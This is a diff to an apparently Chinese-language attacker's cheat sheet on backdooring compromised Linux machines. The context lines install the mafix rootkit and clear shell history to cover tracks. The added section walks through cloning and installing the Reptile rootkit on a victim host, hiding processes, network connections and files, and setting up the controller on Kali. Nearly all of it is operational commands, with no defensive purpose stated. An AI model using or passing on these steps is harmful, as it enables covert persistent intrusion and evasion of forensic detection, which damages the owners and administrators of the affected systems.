@@ -59,3 +59,25 @@ cd mafix<br>
 安装rootkit 命令：./root 密码  端口   (如: ./root xiaoma 9999  接着用ssh连接它的9999端口，用户名是root，密码为xiaoma)
 安装完成后会自动删除目录，为了隐蔽，用 history -c 清除下命令就行了<br>
 控制端执行： ssh ip -p9999
+
+*******************************************************************<br>
+5、Reptile Linux rootkit后门<br>
+肉鸡上安装：<br>
+git clone https://github.com/f0rb1dd3n/Reptile.git<br>
+cd Reptile<br>
+./setup.sh install<br>
+卸载<br>
+./setup.sh remove<br>
+隐藏进程: /reptile/reptile_cmd hide <pid> <br>
+显示进程: /reptile/reptile_cmd show <pid><br>
+隐藏udp: /reptile/reptile_cmd udp <IP> <port> hide <br>
+显示udp: /reptile/reptile_cmd udp <IP> <port> show<br>
+隐藏tcp: /reptile/reptile_cmd tcp <IP> <port> hide <br>
+显示tcp: /reptile/reptile_cmd tcp <IP> <port> show<br>
+还可以隐藏文件 所有包含 reptile 这个字符的文件会被隐藏，这个字符可以在配置文件中修改。<br><br>
+
+Kali上安装控制端<br>
+./setup.sh client<br>
+项目地址：https://github.com/f0rb1dd3n/Reptile<br>
+https://carlstar.club/2019/04/09/rep/#on-vulnerable-ubuntu-192-168-5-148<br>
+https://3hack.com/tools/85.html
